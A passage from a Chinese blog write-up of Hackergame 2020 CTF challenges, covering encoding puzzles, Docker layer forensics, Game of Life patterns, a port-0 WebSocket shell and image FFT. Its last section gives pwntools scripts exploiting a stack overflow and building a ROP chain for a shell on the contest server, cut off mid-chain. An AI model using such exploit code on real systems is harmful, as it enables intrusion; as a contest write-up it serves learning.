'flag'</span></code></pre><p><strong>payload:</strong></p><p><code>+AGYAbABhAGc</code></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103010408030.png" alt="flag2"></p><p><code>flag{please_visit_www.utf8everywhere.org_25xxxxxx}</code></p><p><a href="https://utf8everywhere.org/" target="_blank" rel="noopener">https://utf8everywhere.org/</a>  啊 UTF-8 编码确实是个好东西。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103011937989.png" alt="facts"></p><p><em>草，想想就气（</em></p><hr><h2 id="从零开始的火星文生活"><a href="#从零开始的火星文生活" class="headerlink" title="从零开始的火星文生活"></a>从零开始的火星文生活</h2><blockquote><p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p><p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p><p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p></blockquote><p>有大佬发现了一个<strong>编解码网站</strong>：<a href="http://www.mytju.com/classcode/tools/messyCodeRecover.asp" target="_blank" rel="noopener">http://www.mytju.com/classcode/tools/messyCodeRecover.asp</a></p><p>能够猜测原来和可能的编解码方式。</p><p><em>（BTW, 这个网站不是本地跑的，请注意信息安全</em></p><p>根据提示，应该是先用 GBK 来解码，GBK =&gt; UTF-8，然而结果像这样：</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201104231901155.png" alt="GBK => UTF-8"></p><p>发现不对劲，应该反过来，是 UTF-8 =&gt; GBK。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201104232120053.png" alt="UTF-8 => GBK"></p><p>然后再把拿去恢复。</p><p>发现是要用 GBK 来读，再转换到 iso-8859-1，即 Latin1（28591）。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201104231650349.png" alt="flag"></p><p>要不然就 python 写脚本。（贼想不通这里，佛了</p><p><strong>str == encode ==&gt; bytes == decode ==&gt; str</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'gibberish_message.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>    content <span class="token operator">=</span> fin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>content1 <span class="token operator">=</span> content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>content1<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>content2 <span class="token operator">=</span> content1<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'latin1'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>content2<span class="token punctuation">)</span>content3 <span class="token operator">=</span> content2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>content3<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201104233010095.png" alt="python decode"></p><p>当然也可以在 Linux 下借助 <code>iconv</code></p><pre class=" language-bash"><code class="language-bash"><span class="token function">cat</span> gibberish_message.txt  <span class="token operator">|</span> <span class="token function">iconv</span> -f utf8 -t gbk <span class="token operator">|</span> <span class="token function">iconv</span> -f utf8 -t latin1 <span class="token operator">|</span> <span class="token function">iconv</span> -f gbk -t utf8 <span class="token operator">></span> 1.txt<span class="token comment" spellcheck="true"># OR (utf-8 for default)</span><span class="token comment" spellcheck="true"># cat gibberish_message.txt  | iconv -t gbk | iconv -t latin1 | iconv -f gbk</span></code></pre><p>得到文件内容</p><pre><code>我攻破了 Ｈａｃｋｅｒｇａｍｅ 的服务器，偷到了它们的 ｆｌａｇ，现在我把 ｆｌａｇ 发给你：ｆｌａｇ｛Ｈ４ｖ３＿ＦｕＮ＿ｗ１Ｔｈ＿３ｎｃ０ｄ１ｎｇ＿４Ｎｄ＿ｄ３ｃ０Ｄ１ｎＧ＿xxxxxx｝快去比赛平台提交吧！不要再把这份信息转发给其他人了，要是被发现就糟糕了！</code></pre><p><code>flag{H4v3_FuN_w1Th_3nc0d1ng_4Nd_d3c0D1nG_xxxxxx}</code></p><hr><h2 id="超简单的世界模拟器"><a href="#超简单的世界模拟器" class="headerlink" title="超简单的世界模拟器"></a>超简单的世界模拟器</h2><p>参考：</p><p><a href="https://en.wikipedia.org/wiki/Conway' target=" _blank"="" rel="noopener" s_game_of_life"="">wikipedia: Conway’s Game of Life</a></p><p><a href="https://zhuanlan.zhihu.com/p/261431820" target="_blank" rel="noopener">学术干货 | Conway’s Game of Life 生命游戏的建筑设计应用</a></p><p>这里有个<strong>模拟器</strong>：<a href="https://nealwang.net/JustForFun/GameOfLife.html" target="_blank" rel="noopener">https://nealwang.net/JustForFun/GameOfLife.html</a></p><p>也挺有意思的。</p><p>两个正方形的第一行分别位于第6行，第26行。</p><h3 id="蝴蝶效应"><a href="#蝴蝶效应" class="headerlink" title="蝴蝶效应"></a>蝴蝶效应</h3><p>消除第一个正方形：</p><p>下面 LWSS 这个图形能水平向右移动。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103154425315.png" alt=""></p><p>而 Glinder 这个图形能向右下角45°方向移动。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103154500247.png" alt="image-20201103154500247"></p><pre><code>000000000000000000000000000000000000000000000000000000000000000000000000000100100000000000000010000000000100010000000000011110000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000# Or000000000000000100100000000000000010000000000100010000000000011110000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201101172719778.png" alt="flag"></p><p>测试中发现这些能清除下面的正方形（（</p><pre><code>000000000000000000000000000000000000000000000000000000010000000000000001000100100000111000000010000000000100010000000000011110000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000# OR000000000000000000000000000100000000000000010000000000001110000000000000000100100000000000000010000000000100010000000000011110000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</code></pre><h3 id="一石二鸟"><a href="#一石二鸟" class="headerlink" title="一石二鸟"></a>一石二鸟</h3><p>需要同时消除两个正方形。</p><p>试了好久没出来，最后还是瞎改出来的233。</p><p>发现下面这个图形能向外扩散，于是试试。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103154324961.png" alt=""></p><pre><code>000000000000000000000000000000000000000000000000000000000000000000000000000000000000010010000000000000001000000000010001000000000001111000000000000000000000000000000001100000000000000100000000000011100000000000000000000000000</code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103154207576.png" alt="flag2"></p><hr><h2 id="233-同学的-Docker"><a href="#233-同学的-Docker" class="headerlink" title="233 同学的 Docker"></a>233 同学的 Docker</h2><blockquote><p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p><p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p><p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p><ul><li>Docker Hub 地址：<a href="https://hub.docker.com/r/8b8d3c8324c7/stringtool" target="_blank" rel="noopener">8b8d3c8324c7/stringtool</a></li></ul></blockquote><p>首先把镜像拉下来</p><pre class=" language-bash"><code class="language-bash">docker pull 8b8d3c8324c7/stringtool</code></pre><p>在 <a href="https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore" target="_blank" rel="noopener">Image Layers</a> 里可以看到删除 <code>flag.txt</code> 的层。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201101000901233.png" alt="Image Layers"></p><p>或者</p><pre class=" language-bash"><code class="language-bash">docker <span class="token function">history</span> 8b8d3c8324c7/stringtool</code></pre><p>那么我们就找一找构建过程中的文件好了。</p><p>把镜像导出来。</p><pre class=" language-bash"><code class="language-bash">docker save 8b8d3c8324c7/stringtool <span class="token operator">></span> images.tar</code></pre><blockquote><p>BTW, <code>docker save</code> 用来将一个或多个 <strong>image</strong> 打包保存，而 <code>docker export</code> 用来将 <strong>container</strong> 的文件系统进行打包。</p><p><code>docker load</code> 用来载入镜像包，<code>docker import</code> 用来载入容器包，但两者都会恢复为镜像；</p><p><code>docker load</code> 不能对载入的镜像重命名，而 <code>docker import</code> 可以为镜像指定新名称。</p><p>（参考 <a href="https://blog.csdn.net/liukuan73/article/details/78089138" target="_blank" rel="noopener">docker save与docker export的区别</a>）</p></blockquote><p>在里面找到了。<em>（话说有没有快一点的方法唉</em></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201101001523820.png" alt="images"></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201101001540120.png" alt="flag">    </p><p><code>flag{Docker_Layers!=PS_Layers_hhh}</code></p><p>顺便看了一眼 Dockerfile。</p><pre class=" language-dockerfile"><code class="language-dockerfile"># Set the base image to use to centos 7FROM centos:7# Set the file maintainerMAINTAINER Software_Engineering_Project# Install necessary toolsRUN yum -y install wget make yum-utils# Install python dependenciesRUN yum-builddep python -y# Install tools neededRUN yum -y install gccRUN yum -y install vimRUN yum -y install mariadb-devel# Download the python3.7.3RUN wget -O /tmp/Python-3.7.3.tgz https://www.python.org/ftp/python/3.7.3/Python-3.7.3.tgz# Build and install python3.7.3RUN tar -zxvf /tmp/Python-3.7.3.tgz -C /tmp/RUN /tmp/Python-3.7.3/configureRUN make && make install# Create symbolic linkRUN rm -f /usr/bin/pythonRUN ln -s /usr/local/bin/python3 /usr/bin/pythonRUN ln -s /usr/local/bin/pip3 /usr/bin/pip# Upgrade the pipRUN pip install --upgrade pip# Fix the yumRUN sed -i 's/python/python2/' /usr/bin/yum# CleanRUN rm -rf /tmp/Python-3.7.3*RUN yum clean allRUN pip3 install ipythonRUN pip3 install bpythonRUN pip3 install pipenvENV PYTHONUNBUFFERED 1RUN mkdir /codeWORKDIR /codeCOPY . /code/RUN rm /code/flag.txtENTRYPOINT python /code/app.py</code></pre><p>每一次 RUN 都是新开一个容器执行相应的操作，在当前镜像基础上执行指定命令，并提交为新的镜像。</p><p>某种程度上可以说镜像是一个分层的文件系统。Docker 镜像实际上就是由这样的一层层文件进行叠加起来的，上层的文件会覆盖下层的同名文件。而各层里有重复的文件，因此镜像要大得多。这些层合并在一起就成了容器里的内容。</p><p>也正是如此，flag 也能够被找到了23333.</p><hr><h2 id="从零开始的-HTTP-链接"><a href="#从零开始的-HTTP-链接" class="headerlink" title="从零开始的 HTTP 链接"></a>从零开始的 HTTP 链接</h2><blockquote><p>众所周知，数组下标应当从 0 开始。</p><p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p><p>你能成功连接到 0 号端口并拿到 flag 吗？</p><p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p><p><a href="http://202.38.93.111:0/" target="_blank" rel="noopener">http://202.38.93.111:0/</a></p></blockquote><p>这个真的有意思。一般 TCP 端口都是1-65535，于是很多客户端都不支持 0 号端口。</p><p>好在部分版本的 curl 以及 wget 支持。</p><p>然而我在本地跑还连不上这个端口，怕是被运营商掐断了？</p><p>在VPS上试试，发现可行。</p><pre class=" language-bash"><code class="language-bash">curl http://202.38.93.111:0<span class="token comment" spellcheck="true"># 或者 </span><span class="token comment" spellcheck="true"># wget http://202.38.93.111:0</span></code></pre><p>得到一个网页，发现是一个 xterm 终端，和其他题目的在线终端一样的。</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Terminal<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/js/xterm/css/xterm.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/js/xterm/lib/xterm.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/js/xterm-addon-attach/lib/xterm-addon-attach.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/js/xterm-addon-fit/lib/xterm-addon-fit.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">      <span class="token selector"><span class="token id">#terminal</span> </span><span class="token punctuation">{</span>        <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>        <span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token property">right</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token property">bottom</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>terminal<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">      <span class="token keyword">const</span> term <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Terminal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">const</span> fitAddon <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FitAddon<span class="token punctuation">.</span>FitAddon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      term<span class="token punctuation">.</span><span class="token function">loadAddon</span><span class="token punctuation">(</span>fitAddon<span class="token punctuation">)</span><span class="token punctuation">;</span>      term<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"terminal"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      fitAddon<span class="token punctuation">.</span><span class="token function">fit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'resize'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>        fitAddon<span class="token punctuation">.</span><span class="token function">fit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> firstmsg <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>      <span class="token keyword">const</span> socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span>        location<span class="token punctuation">.</span>origin<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/^http/</span><span class="token punctuation">,</span> <span class="token string">"ws"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/shell"</span>      <span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">const</span> attachAddon <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AttachAddon<span class="token punctuation">.</span>AttachAddon</span><span class="token punctuation">(</span>socket<span class="token punctuation">)</span><span class="token punctuation">;</span>      term<span class="token punctuation">.</span><span class="token function">loadAddon</span><span class="token punctuation">(</span>attachAddon<span class="token punctuation">)</span><span class="token punctuation">;</span>      socket<span class="token punctuation">.</span>onclose <span class="token operator">=</span> event <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        term<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"\nConnection closed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">;</span>      socket<span class="token punctuation">.</span>onmessage <span class="token operator">=</span> event <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>firstmsg<span class="token punctuation">)</span> <span class="token punctuation">{</span>          firstmsg <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>          <span class="token keyword">let</span> token <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          window<span class="token punctuation">.</span>history<span class="token punctuation">.</span><span class="token function">replaceState</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">)</span> <span class="token punctuation">{</span>            localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            token <span class="token operator">=</span> localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">)</span> socket<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>token <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span><span class="token punctuation">;</span>      term<span class="token punctuation">.</span><span class="token function">focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>这个逻辑是访问网页后实例化一个 WebSocket，将 HTTP 升级到 WS 协议，URI 为 ws://202.38.93.111:0/shell</p><p>于是乎就去找 websocket 客户端来实现。</p><p>最开始想用 pwntools，发现能作为 socket 连上但还模仿不了 ws<em>（可能没领悟到</em>。</p><p>之后找到了 GitHub 上的 <strong><a href="https://github.com/websocket-client/websocket-client" target="_blank" rel="noopener">websocket-client</a></strong>，这是一个 Python 的 ws 库，本来想直接用他现成的 <code>wsdump.py</code>，发现连不上。。</p><p>最后又找了个编译好的客户端，<strong><a href="https://github.com/vi/websocat" target="_blank" rel="noopener">websocat</a></strong>，按照安装说明进行安装，再连接服务器就完事了。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201101162810752.png" alt="flag"></p><hr><h2 id="来自一教的图片"><a href="#来自一教的图片" class="headerlink" title="来自一教的图片"></a>来自一教的图片</h2><blockquote><p>小 P 在一教做<strong>傅里叶光学</strong>实验时，在实验室电脑的模拟程序里发现了这么一张的图片：</p><p><img src="/2020/11/08/CTF_2020Hackergame/4f_system_middle.bmp" alt="img"></p><p>数理基础并不扎实的小 P 并不知道什么东西成像会是这个样子：又或许什么东西都不是，毕竟这只是模拟 … 但可以确定的是，这些看似奇怪的花纹里确实隐藏着一些信息，或许是地下金矿的藏宝图也未可知。</p></blockquote><p>根据提示应该与 傅里叶变换 有关。</p><p>给图片做个 FFT 处理，就得到 flag 了。</p><p><img src="/2020/11/08/CTF_2020Hackergame/fourier.png" alt="fourier"></p><p>拼一下就能得到</p><p><code>flag{Fxurier_xptics_is_fun}</code></p><p>噢 Fourier optics 的确是傅里叶光学，嘻嘻嘻。</p><hr><h2 id="超简陋的-OpenGL-小程序"><a href="#超简陋的-OpenGL-小程序" class="headerlink" title="超简陋的 OpenGL 小程序"></a>超简陋的 OpenGL 小程序</h2><p>啥也不懂，魔改就是了。</p><p>把文件删了点东西，他出来这样的。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201102203227613.png" alt=""></p><p>不对劲，查了一下这个好像是 OpenGL着色器语言(GLSL)。</p><p>有机会可以看看 <a href="https://learnopengl-cn.readthedocs.io/zh/latest/01%20Getting%20started/05%20Shaders/" target="_blank" rel="noopener">OpenGL 入门文档</a>。</p><p>最后魔改了 <code>basic_lighting.vs</code> 这个文件。看不清楚就改改偏移就好了。</p><pre><code>void main(){    FragPos = vec3(projection * vec4(aPos-0.45, 1.0));    Normal = aNormal;      gl_Position = projection * view * vec4(FragPos, 1.0);}</code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201102230459235.png" alt="flag"></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201102230203413.png" alt="flag"></p><p><code>flag{glGraphicsHappy(233);}</code></p><hr><h2 id="生活在博弈树上"><a href="#生活在博弈树上" class="headerlink" title="生活在博弈树上"></a>生活在博弈树上</h2><h3 id="始终热爱大地"><a href="#始终热爱大地" class="headerlink" title="始终热爱大地"></a>始终热爱大地</h3><p>是个最基本的<strong>栈溢出</strong>。</p><p><code>gets(input);</code>函数存在漏洞，看一下栈上情况。</p><p><code>input</code> 对应 <code>v14</code>，<code>success</code> 对应 <code>v17</code></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103231134749.png" alt=""></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103231221608.png" alt="stack"></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103231201409.png" alt="stack"></p><p>偏移为 -0x01-(-0x90) = 0x8F</p><p>bool 库里的 <code>true</code> 为 0x01。</p><p>把这个 <code>success</code> 覆盖为 0x01 就能出 flag 了。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># coding: utf-8</span><span class="token triple-quoted-string string">"""Hackergame_tictactoe@Author: MiaoTony@Time: 20201103"""</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>token <span class="token operator">=</span> <span class="token string">'xxxxxxxxxxxxxxxxxxx'</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"202.38.93.111"</span><span class="token punctuation">,</span> <span class="token number">10141</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please input your token: '</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span>payload <span class="token operator">=</span> b<span class="token string">'1'</span> <span class="token operator">*</span> <span class="token number">0x8F</span>payload <span class="token operator">+=</span> b<span class="token string">'\x01'</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'such as (0,1): '</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103230743129.png" alt="flag"></p><p><code>flag{easy_gamE_but_can_u_get_my_shel1}</code></p><h3 id="升上天空"><a href="#升上天空" class="headerlink" title="升上天空"></a>升上天空</h3><p>要拿 shell 啊。。</p><p>先用 ROPgadget 生成 ROP Chain.</p><pre class=" language-bash"><code class="language-bash">ROPgadget --binary tictactoe --ropchain</code></pre><p>然后把这个放到返回值的位置打过去就完事了。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># coding: utf-8</span><span class="token keyword">from</span> struct <span class="token keyword">import</span> pack<span class="token keyword">from</span> pwn <span class="token keyword">import</span> context<span class="token punctuation">,</span> remotecontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>token <span class="token operator">=</span> <span class="token string">'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"202.38.93.111"</span><span class="token punctuation">,</span> <span class="token number">10141</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please input your token: '</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span>payload <span class="token operator">=</span> b<span class="token string">'1'</span> <span class="token operator">*</span> <span class="token number">0x8F</span>payload <span class="token operator">+=</span> b<span class="token string">'\x01'</span>payload <span class="token operator">+=</span> b<span class="token string">'1'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token comment" spellcheck="true"># Padding goes here</span>p <span class="token operator">=</span> b<span class="token string">''</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000407228</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># pop rsi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004a60e0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># @ .data</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000043e52c</span><span class="token punctuation">)</span>  <span 